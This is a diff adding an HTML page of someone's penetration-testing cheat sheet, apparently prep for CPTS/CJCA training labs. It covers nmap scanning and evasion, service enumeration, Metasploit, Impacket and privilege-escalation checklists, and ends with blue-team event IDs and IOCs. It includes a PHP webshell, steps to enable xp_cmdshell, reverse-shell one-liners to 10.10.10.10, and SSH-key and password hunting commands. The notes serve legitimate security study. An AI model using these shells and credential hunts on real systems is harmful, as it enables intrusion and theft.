@@ -1,0 +1,752 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CJCA Field Notes</title>
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<h1>cjca field notes</h1>
+<p>this is my collection of terminal witchcraft that help get the job done...<br>
+combination of CPTS and CJCA methodology and some out-of-the-way tradecraft [+]</p>
+
+<h2>creds-tracker</h2>
+<pre><code>creds() {
+  echo "$*" >> ~/.creds
+  echo "[+] Added"
+}
+
+alias 'creds?'='cat ~/.creds 2>/dev/null'
+
+credsreset() {
+  > ~/.creds
+  echo "[+] Credentials cleared"
+}</code></pre>
+
+<h2>ip-tracker</h2>
+<pre><code>ipx() {
+  export ipx="$1"
+  
+  if grep -q '^export ipx=' ~/.bashrc; then
+    sed -i "s/^export ipx=.*/export ipx=$1/" ~/.bashrc
+    else
+      echo "export ipx=$1" >> ~/.bashrc
+      fi
+      
+      echo "[+] ipx set to $ipx"
+}</code></pre>
+
+<h2>basics</h2>
+<pre><code>alias addhost='sudo nano /etc/hosts'
+alias ifc='ifconfig'
+alias c='curl ifconfig.me'
+alias c2='curl ipinfo.io'
+alias www='python -m http.server 9000'</code></pre>
+
+<h2>infrastructure</h2>
+<ul>
+<li>host discovery</li>
+<li>all ports on all hosts</li>
+<li>route and ping test</li>
+<li>firewalls</li>
+<li>dns</li>
+<li>vhosts</li>
+</ul>
+<p>--&gt; make an asset inventory<br>
+--&gt; sketch out the network map</p>
+
+<h2>NMAP-SYSTEM</h2>
+<p>standard scan nmap &lt;ip&gt;</p>
+<ul>
+<li>all open</li>
+<li>top 100 tcp</li>
+<li>top 100 udp</li>
+<li>NSE the ports and -sC -sV</li>
+</ul>
+
+<p>UDP and firewall check</p>
+<pre><code>sudo nmap -sUV -Pn --disable-arp-ping --source-port 53 &lt;ip&gt;</code></pre>
+
+<h3>-evasion-techniques-</h3>
+<ul>
+<li>--disable-arp-ping</li>
+<li>--top-ports</li>
+<li>-F</li>
+<li>-sU</li>
+<li>-A</li>
+<li>-D RND:5</li>
+<li>-g</li>
+<li>--min-rate 300</li>
+<li>-T 2</li>
+<li>-PE</li>
+<li>--packet-trace</li>
+<li>-Pn</li>
+<li>-sn</li>
+<li>-sUV</li>
+<li>-n</li>
+<li>--script=banner</li>
+</ul>
+
+<pre><code>sudo nmap -sV -Pn --disable-arp-ping
+sudo ncat -nv --source-port 53 &lt;ip&gt; 50000
+
+sudo nmap &lt;ip&gt; -sV -Pn --disable-arp-ping --source-port 53</code></pre>
+
+<p>&gt; could be a high number port</p>
+
+<p>nmap fast for open ports</p>
+<pre><code>    sudo nmap -sS -p- -Pn -n --min-rate 5000 --open 10.129.35.116</code></pre>
+
+<p>QUICK AND DIRTY:</p>
+<pre><code>    sudo nmap -sS -p- -Pn -n --min-rate 5000 --open &lt;target&gt;
+nmap -sC -sV -p &lt;ports&gt; $ipx</code></pre>
+
+<p>then pentest for behavior:</p>
+<p>ping sweep</p>
+<pre><code>    nmap -sn &lt;subnet&gt;</code></pre>
+<p>fast scan</p>
+<pre><code>    nmap -T4 -F &lt;target or list)</code></pre>
+<p>check for firewall</p>
+<pre><code>    use ACK to see if port responds differently
+nmap -sA &lt;target&gt;
+
+compare unfiltered ACK to filetered SYN</code></pre>
+<p>full scan</p>
+<pre><code>    nmap -p- -T4 -Pn &lt;target&gt;
+
+if the scan hangs, try min-rate 1000, --max-retries 1</code></pre>
+  <p>service enum</p>
+  <pre><code>    now you have a list of ports
+  nmap -sC -sV -p 21,22,443 &lt;target)
+  
+  now you have a list of services
+  nmap --script "vuln" -p 22 &lt;target&gt;
+
+vuln can be noisy! (works nice on port 80)</code></pre>
+<p>if firewall drops packets</p>
+<pre><code>    use -T3 not -T4</code></pre>
+<p>80 and 443 &gt; send to gobuster</p>
+<p>search for scripts:</p>
+<pre><code>    ls /usr/share/nmap/scripts | grep http</code></pre>
+<p>firewall:</p>
+<pre><code>    -f to fragment packets
+--source-port 53</code></pre>
+<p>lastly check UDP</p>
+<pre><code>    sudo nmap -F -sU</code></pre>
+<p>way to get DNS info from a firewalled host:</p>
+<pre><code>    sudo nmap -sU -p 53 --script dns-nsid $ipx</code></pre>
+
+<pre><code>Ping sweep:     nmap -sn &lt;subnet&gt;
+Fast scan:      nmap -T4 -F &lt;target&gt;
+Full TCP:       nmap -p- -T4 -Pn &lt;target&gt;
+UDP (quick):    sudo nmap -F -sU --top-ports 100 &lt;target&gt;
+Firewall check: nmap -sA &lt;target&gt;  (compare ACK vs SYN)
+Firewall bypass: -f (fragment)  --source-port 53
+If scan hangs:    --min-rate 1000 --max-retries 1</code></pre>
+
+<h2>FTP-SWEEP</h2>
+<pre><code>nmap -sV -sC -p21 $ipc
+nmap -p21 --script ftp-* $ipx</code></pre>
+<p>try anonymous login</p>
+<pre><code>pwd ls -la  dir  cd &lt;dir&gt;  get &lt;file&gt;  mget *
+
+put test.txt
+mkdir test</code></pre>
+<p>web root access?<br>
+uploading directory?</p>
+<p>if it's a webserver then try putting a webshell</p>
+<pre><code>    &lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+<p>check version, search public exploit</p>
+<pre><code>get all FTP
+
+wget -m --ftp-user=anonymous --ftp-password="" ftp://&lt;ip&gt;</code></pre>
+
+<h2>SMB-sweep</h2>
+<pre><code>nmap -sC -sV -p 139,445
+
+nmap -p 139,445 --script smb-os-discovery
+
+nmap -p 139,445 --script smb*
+
+nmap -p 139,445 --script script smb-vuln*
+
+rpcclient -U "" -N $ipx
+
+srvinfo
+querydominfo
+enumlsgroupsdomain
+queryuser &lt;rid&gt;
+lookupnames &lt;username&gt;
+lsaquery
+
+smbclient -L //$ipx/ -N
+
+enum4linux-ng -A $ipx
+
+smbclient //&lt;target_ip&gt;/&lt;share_name&gt; -U &lt;username&gt;
+
+sudo mount -t cifs //&lt;target_ip&gt;/&lt;share_name&gt; /mnt/&lt;mount_point&gt; -o username=&lt;user&gt;
+
+smbmap -H $ipx
+
+check smbv1
+
+smbclient -L //&lt;IP&gt; -N \
+--option='client min protocol=NT1' \
+--option='client max protocol=NT1'
+
+smbclient //&lt;IP&gt;/&lt;share&gt; -N \
+--option='client min protocol=NT1' \
+--option='client max protocol=NT1'</code></pre>
+
+<h2>DNS-PENTEST</h2>
+<pre><code>whois
+
+dig axfr @&lt;target_ip&gt; &lt;domain.com&gt;
+fierce --domain &lt;domain.com&gt; --dns-server &lt;target_ip&gt;
+
+gobuster dns -d &lt;domain.com&gt; -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -r &lt;target_ip&gt;
+
+nmap --script dns-cache-snoop.nse
+
+nmap -sU -p53 --script dns-brute,dns-nsid,dns-zone-transfer &lt;target_ip&gt;
+
+QUICK AND DIRTY
+dnsrecon -d dev.inlanefreight.htb -n $ipx -D /usr/share/wordlists/dnsmap.txt -t brt
+
+dig @$ipx version.bind CH TXT
+
+BANNER GRABBING
+dig version.bind CHAOS TXT @DNS
+
+nmap --script dns-nsid &lt;DNS_IP&gt;
+
+nc -nv -u &lt;DNS_IP&gt; 53
+
+dig NS &lt;target-domain&gt;
+
+nslookup -type=NS &lt;target-domain&gt;
+
+nslookup -type=NS &lt;target-domain&gt;
+
+
+dnsenum --dnsserver &lt;DNS_IP&gt; --enum -p 0 -s 0 -o subdomains.txt -f &lt;WORDLIST&gt; &lt;DOMAIN&gt;
+
+dig A
+
+dig -X
+
+nslookup -type=MX
+
+fierce --domain &lt;DOMAIN&gt; --dns-servers &lt;DNS_IP&gt;</code></pre>
+
+<p>note to self:</p>
+<ul>
+<li>axfr works on second level domain (thing.htb), not on subdomain (dev.thing.htb)</li>
+<li>so first add a 2nd level domain to your hosts file</li>
+</ul>
+
+<h2>TESTING-EMAIL</h2>
+<pre><code>nmap -sV -sC -p 25,110,143,993,995 $ipx
+nmap --script smtp-open-relay $ipx
+
+nc $ipc 25
+VRFY
+smtp-user-enum (script has a problem, needs to be tested_
+
+Identify which IMAP/POP3 service is running (dovecot, exchange or what)
+
+openssl s_client -connect &lt;target&gt;:99
+
+CAPABILITY
+
+if no TLS, then sniff plaintext
+  
+  check SMTP information leakage
+  
+  check for username and naming conventions
+  
+  OPEN RELAY?
+  
+  telnet $ipx 25
+  HELO example.com
+  MAIL FROM:&lt;test@attacker.com&gt;
+RCPT TO:&lt;controlled-email@gmail.com&gt;
+DATA
+(type message, end with a . on a new line)
+
+can also use with msf
+use auxiliary/scanner/smtp/smtp_relay</code></pre>
+<p>open relay is a high / critical finding</p>
+
+<h2>CONNECING-TO-EMAIL</h2>
+<pre><code>nmap -sV -sC -p 25,110,143,465,587,993,995 &lt;target&gt;
+
+nc -nv &lt;ip&gt; 25
+
+USER anonymous / PASS &lt;anything&gt; on POP3.
+
+A01 LOGIN "" / A01 LOGIN "anonymous" "anonymous" on IMAP.
+
+smtp-user-enum
+
+hydra -L users.txt -P passwords.txt &lt;target&gt; imap
+
+curl -k 'imaps://&lt;ip&gt;' --user &lt;user&gt;:&lt;pass&gt;
+
+curl -k 'pop3s://&lt;ip&gt;' --user &lt;user&gt;:&lt;pass&gt;
+
+openssl s_client -connect &lt;ip&gt;:993
+
+A01 LOGIN &lt;user&gt; &lt;pass&gt;
+
+A02 LIST "" *
+
+A03 SELECT "&lt;folder_name&gt;"
+
+A04 FETCH 1:* BODY[HEADER]
+
+A05 FETCH 1 BODY[TEXT] (Replace 1 with message ID)
+
+
+
+openssl s_client -connect &lt;ip&gt;:995
+
+USER &lt;user&gt; then PASS &lt;pass&gt;
+
+LIST
+
+
+
+RETR &lt;message_number&gt;
+
+QUIT</code></pre>
+<p>always check if there are multiple accounts to test.<br>
+(email needs creds, so go back and check all ports)</p>
+
+<h2>SNMP</h2>
+<pre><code>snmpwalk -v2c -c public $ipx
+
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $ipx
+
+braa public@$ipx:.1.3.6.*</code></pre>
+
+<h2>MYSQL</h2>
+<pre><code>sudo nmap $ipx -sV -sC -p3306 --script mysql*
+
+mysql -u username -pass -h &lt;ip&gt; --skip-ssl   (if you get a certificate issue)
+
+might get an unusual port:
+-P: (Optional) Specifies a custom port if you are not using the default 3306.
+
+show databases;
+
+use &lt;name&gt;;
+
+show tables;
+
+show columns from &lt;table&gt;;
+
+select * from &lt;table&gt;;
+
+select * from &lt;table&gt; where &lt;column&gt; = "&lt;string&gt;";   (search for string, probably an attribute name)
+
+select * from myTable where name = "Some Name";</code></pre>
+
+<h2>MSSQL</h2>
+<pre><code>sudo nmap \
+--script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes \
+--script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER \
+-sV \
+-p 1433 \
+&lt;ip&gt;
+
+**NOTE: problem with NSE, just connect mannually
+
+
+msf6 auxiliary(scanner/mssql/mssql_ping) &gt; set rhosts $ipx
+
+impacket-mssqlclient user@$ipx -windows-auth
+
+select name from sys.databases
+
+SELECT SYSTEM_USER;
+SELECT IS_SRVROLEMEMBER('sysadmin'); -- Returns 1 if you are admin
+
+SELECT name FROM sys.databases;
+-- Find tables in the current database
+SELECT name FROM sys.tables;
+
+EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+
+-- Now test OS command execution
+
+EXEC xp_cmdshell 'whoami';</code></pre>
+
+<h2>PATHS</h2>
+<pre><code>/usr/share/metasploit-framework/
+
+/usr/share/nmap/scripts/
+
+/usr/share/wordlists
+
+/usr/share/seclists
+
+/usr/share/doc/python3-impacket/examples
+
+/usr/share/wordlists/dnsmap.txt
+
+* remember seclists SNMP</code></pre>
+
+<h2>MSF</h2>
+<pre><code>try a different payload
+
+if you already have a shell, you can send yourself a meterpreter session
+  setup a handler first
+  
+  you can encode your payload and check it with virus total
+  
+  msf-virustotal -k &lt;API key&gt; -f TeamViewerInstall.exe
+  
+  exploit -j
+  sessions
+  session 1 -i
+  search type:post
+  search platform:windows post/gather
+  
+  set session 1
+  run
+  
+  post/windows/gather/enum_creds
+  post/linux/gather/enum_system
+  post/windows/manage/persistence
+  post/multi/manage/autoroute
+  
+  got shell?
+  run directly in shell
+  run post/windows/gather/checkvm
+  run post/multi/recon/local_exploit_suggester</code></pre>
+  
+  <h2>IMPACKET</h2>
+  <pre><code>impacket-[TAB][TAB]
+  impacket-psexec -h
+  
+  do you have creds or NTLM hash?
+    impacket-wmiexec
+    impacket-psexec
+    impacket-smbexec
+    
+    do you have local access and want to dump creds?
+      impacket-secretsdump
+      
+      Active Directory?
+      impacket-GetNPUsers (as-rep, no pre-auth, request a ticket and crack it offline)
+      impacket-GetUserSPNs (kerberoast, request ticket, export and crack)
+      
+      Can you intercept traffic?
+      impacket-ntlmrelayx</code></pre>
+      
+      <h2>SHELLS</h2>
+      <pre><code>$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -&gt;
+        
+        python3 -c 'import pty;pty.spawn("/bin/bash")'
+      python2 -c 'import pty;pty.spawn("/bin/bash")'
+      
+      export TERM=xterm-256color
+      stty rows 40 columns 120
+      
+      alias ls='ls --color=auto'
+      export PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\[\e[1;34m\]\w\[\e[0m\]\$ '
+      
+      
+      /usr/bin/script -q /dev/null /bin/bash (if no python0
+      
+      
+      python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("10.10.10.10",4445));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn("/bin/sh")'
+      
+      bash -c 'bash -i &gt;& /dev/tcp/10.10.10.10/4444 0&gt;&1'</code></pre>
+      
+      <h2>webserver</h2>
+      <pre><code>try 80 and 443
+      whatweb http://target
+      nikto -h http://target
+      nmap -p 80,443,8080 --script http-enum,http-methods &lt;ip/fqdn?</code></pre>
+      
+      <h2>privesc</h2>
+      <p>first run linpeas / winpeas / linenum / exploit-suggester / watson / sharpup /<br>
+      setup a file transfer, transfer output back to Parrot for analysis<br>
+      take an hour and read the output</p>
+      <pre><code>sudo -l (GTFO)
+      
+      look for world writable files (for example in /var/www/html or /home/*)
+      
+      open file and add a malicious command (create a new admin user or spawn a root shell)
+      
+      cronjob running as root. check path. is the directory of target file writable?
+      
+      then
+      rev shell
+      user creation
+      data exfil
+      
+      path hijacking
+      modify PATH variable?
+      or write to a directory that appears earlier in PATH?
+      system searches PATH from left to right
+      
+      token impersonation
+      
+      user - group - others
+      
+      SUID
+      x is s !??
+      anyone can execute with the privs of the file's owner
+      
+      find / -perm -4000 2&gt;/dev/null</code></pre>
+      
+      <p>WE ARE LOOKING FOR:</p>
+      <ul>
+      <li>can i run anything as root?</li>
+      <li>does a binary execute as root?</li>
+      <li>can a binary bypass normal permissions?</li>
+      <li>does root execute something i control?</li>
+      <li>can i modify trusted files?</li>
+      <li>can I replace what root loads?</li>
+      <li>is the kernel vulnerable?</li>
+      <li>did someone leave passwords, SSH keys, tokens?</li>
+      <li>can i log into another host?</li>
+      <li>same password elsewhere?</li>
+      <li>config files / database and app credentials</li>
+      <li>mounted NFS/ samba shares</li>
+      <li>trust relationships / which host trusts this one?</li>
+      <li>domain access / kerberos / ldap</li>
+      <li>can i escape into a host or container?</li>
+      <li>can i become root?</li>
+      <li>can i become another user?</li>
+      <li>can i access another host?</li>
+      <li>can i get credentials?</li>
+      <li>can i MAKE US OF something that already runs with higher privileges?</li>
+      </ul>
+      
+      <h2>LINUX</h2>
+      <h3>-permissions-trick-</h3>
+      <p>drwx--x--x</p>
+      <p>cannot do   ls /home/alice/secret</p>
+      <p>but if you know the file name</p>
+      <pre><code>cat /home/alice/secret/flag.txt</code></pre>
+      <p>example:</p>
+      <pre><code>drwx--x--x  alice alice  secret
+      -r--r-----  alice users  password.txt</code></pre>
+      <p>and you are in the 'users' group</p>
+      <p>look for this:</p>
+      <pre><code>drwx--x--x
+      ^
+      
+      so you might be in a GROUP that has permissions over something
+      you need -x on directory and -r on file</code></pre>
+      <p>example:</p>
+      <pre><code>    drwx--x--x  alice   &lt;---
+      
+      alice's home is traversable
+      
+      d rwx r-x r-x
+      │ │││ │││ │││
+      │ │││ │││ └── Others
+      │ │││ └────── Group
+      │ └────────── Owner
+      └──────────── Type</code></pre>
+      
+      <pre><code># Identity / Privs
+      id
+      whoami
+      sudo -l
+      groups (IMPORTANT)
+      
+      # Host info / OS
+      hostname
+      uname -a
+      cat /etc/os-release
+      cat /etc/issue
+      
+      # Users / Groups
+      cat /etc/passwd
+      cat /etc/group
+      last
+      
+      # Network
+      ip a
+      ip route
+      arp -a
+      ss -tulpn
+      netstat -ano
+      
+      # Processes / Services
+      ps aux
+      ps -ef
+      systemctl list-units --type=service
+      
+      # Cron / Scheduled Tasks
+      crontab -l
+      ls -la /etc/cron*
+      
+      # Shares / Mounts
+      mount
+      cat /etc/fstab
+      showmount -e 127.0.0.1
+      
+      # Environment / Loot
+      env
+      cat ~/.bash_history
+      cat ~/.ssh/id_rsa
+      
+      # FAST targeted search
+      find / -name user.txt 2&gt;/dev/null
+      find / -name root.txt 2&gt;/dev/null
+      find / -name "*.config" -o -name "*.conf" 2&gt;/dev/null 2&gt;/dev/null
+      
+      # FAST credential / secret hunting
+      grep -rnw '/var/www/' -e 'password' 2&gt;/dev/null
+      grep -rnw '/etc/' -e 'pass' 2&gt;/dev/null
+      find / -perm -4000 2&gt;/dev/null   # SUID files
+      find / -perm -2000 2&gt;/dev/null   # SGID files</code></pre>
+      
+      <h2>windows</h2>
+      <p>Can I become someone else?<br>
+      No.<br>
+      Can I abuse a SYSTEM process?<br>
+      No.<br>
+      Can I modify something that SYSTEM executes?<br>
+      ...</p>
+      
+      <h3>-first-</h3>
+      <pre><code>whoami /all
+      
+      whoami /priv
+      
+      systeminfo
+      
+      hostname
+      
+      cmdkey /list
+      
+      net user
+      
+      net localgroup administrators</code></pre>
+      
+      <p>feeling lost? GET HELP</p>
+      <pre><code>    winpeas    winPEASx64.exe &gt; peas.txt
+      seatbelt
+      PowerUp.ps1 (sharpUp)
+      privescCheck</code></pre>
+      <p>SCAN TAKES TIME, DO A MANUAL CHECK OR REVIEW EVIDENCE WHILE IT RUNS, OR TAKE A BREAK</p>
+      
+      <pre><code># Identity &amp; Privileges
+      whoami
+      whoami /all
+      whoami /priv
+      
+      # Host Info &amp; OS
+      hostname
+      systeminfo
+      
+      # Users &amp; Groups
+      Get-LocalUser
+      Get-LocalGroup
+      Get-LocalGroupMember Administrators
+      
+      # Network &amp; Connectivity
+      ipconfig /all
+      route print
+      arp -a
+      netstat -ano
+      Test-Connection 172.16.5.1 -Count 1
+      
+      # Processes &amp; Services
+      Get-Process
+      Get-Service
+      tasklist /svc
+      Get-ScheduledTask
+      
+      # Shares &amp; Environment Loot
+      Get-SmbShare
+      Get-PSDrive
+      Get-ChildItem Env:
+      echo $env:USERPROFILE</code></pre>
+      
+      <h2>blue</h2>
+      <p>windows event codes</p>
+      <pre><code>    ID1/4625 failed login
+      ID3 network connection
+      ID6 driver loaded
+      ID7 image loaded (DLL)
+      ID11 file created
+      ID12,13,14 reg mod
+      ID22 DNS query
+      ID23 file delete
+      ID25 process tampering
+      ID 10 / 4656/ 4663 process accessed
+      4624 succeeded login (unusual type 3 network, type 10 rdp)
+      4688 process create (commandline or parent-child)
+      7045 service installed
+      4720 user account created
+      4672 special privilege assigned to new logon
+      1102 audit log cleared
+      4732 member added to local group
+      106 new scheduled task
+      4104 script block logging captured code execution (obfuscated string, base64, mimikatz)</code></pre>
+      
+      <p>SYSMON EVENT IDs (Operational log — richer than 4688)</p>
+      <pre><code>  1   Process Create        Image, CommandLine, ParentImage, User, Hashes
+      3   Network Connection    Image → DestinationIp:Port (C2 hunting)
+      7   Image/DLL Loaded      DLL hijacking, unsigned modules
+      8   CreateRemoteThread    injection
+      10  Process Access        LSASS access / credential dump (TargetImage)
+      11  FileCreate            malware drop path
+      12  Registry object added persistence (Run keys)
+      13  Registry value set
+      15  FileCreateStreamHash  ADS / alternate data streams
+      17  Pipe Created
+      18  Pipe Connected
+      22  DNS Query             C2 domain lookup
+      25  Process Tampering</code></pre>
+      
+      <h2>common-false-positives</h2>
+      <ul>
+      <li>failed logon: wrong password typed</li>
+      <li>account lockout: forgot password accross devices</li>
+      <li>powershell: IT admin</li>
+      <li>cmd: batch files, installers, software updates</li>
+      <li>rundll32: windows, control panel, printer</li>
+      <li>regsrv32: software install or updates</li>
+      <li>msiexec: software deployment</li>
+      <li>new service installedL legitimate installation</li>
+      <li>WMI: monitoring software</li>
+      <li>remote logon type: helpdesk, admins, backup software</li>
+      <li>smb: file shares, printer, domain traffic</li>
+      <li>DNS spike: browser startup, windows update, av update</li>
+      <li>encoded powershell: ms management, defender, exchange, SCCM</li>
+      <li>network connection: updater, av engine, telemetry</li>
+      </ul>
+      <p>Does it fit normal business activity?</p>
+      
+      <h2>ioc</h2>
+      <ul>
+      <li>multiple failed logins from same IP</li>
+      <li>successful login after many failures</li>
+      <li>new domain admin account created</li>
+      <li>user added to admins</li>
+      <li>powershell or cmd</li>
+      <li>connecting to C2 IP</li>
+      <li>outbound data transfers</li>
+      <li>sch tasks, services, startup entries</li>
+      <li>AV disabled</li>
+      <li>web server anomalies</li>
+      <li>copy of a .exe in a writable directory</li>
+      </ul>
+      
+      </body>
+      </html>
